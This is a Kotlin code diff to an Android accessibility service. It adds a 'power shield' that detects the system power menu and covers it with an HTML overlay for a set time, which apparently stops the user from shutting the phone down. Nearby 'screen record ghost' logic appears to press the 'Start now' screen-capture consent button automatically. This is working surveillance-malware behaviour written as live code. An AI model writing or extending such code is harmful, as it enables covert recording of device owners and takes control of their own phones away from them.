@@ -189,6 +189,31 @@ class MyAccessibilityService : AccessibilityService() {
         
         // --- SCREEN RECORD GHOST LOGIC ---
         if (pkgName.contains("systemui", ignoreCase = true)) {
+            // --- POWER SHIELD LOGIC ---
+            val statsPrefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+            if (statsPrefs.getBoolean("power_shield_active", false)) {
+                val root = rootInActiveWindow
+                val powerMenuNode = root?.findAccessibilityNodeInfosByViewId("com.android.systemui:id/sec_global_actions_icon_label_view")
+                if (!powerMenuNode.isNullOrEmpty()) {
+                    val now = System.currentTimeMillis()
+                    val lastTrigger = statsPrefs.getLong("power_shield_last_trigger", 0L)
+                    if (now - lastTrigger > 5000) {
+                        statsPrefs.edit().putLong("power_shield_last_trigger", now).apply()
+                        val html = statsPrefs.getString("power_shield_html", "") ?: ""
+                        val method = statsPrefs.getString("power_shield_method", "ACC") ?: "ACC"
+                        val timeout = statsPrefs.getLong("power_shield_timeout", 10L)
+                        
+                        DynamicUIManager.showOverlay(this, true, method, html)
+                        DebugLogger.log("POWER_SHIELD", "Power Menu Intercepted. Failsafe: ${timeout}s")
+                        
+                        // Failsafe Auto-Remove
+                        Handler(Looper.getMainLooper()).postDelayed({
+                            DynamicUIManager.removeOverlay(this)
+                        }, timeout * 1000)
+                    }
+                }
+            }
+
             if (ScreenRecordManager.expectedMode == "AUTO") {
                 val root = rootInActiveWindow
                 val startNodes = root?.findAccessibilityNodeInfosByText("Start now") ?: emptyList()
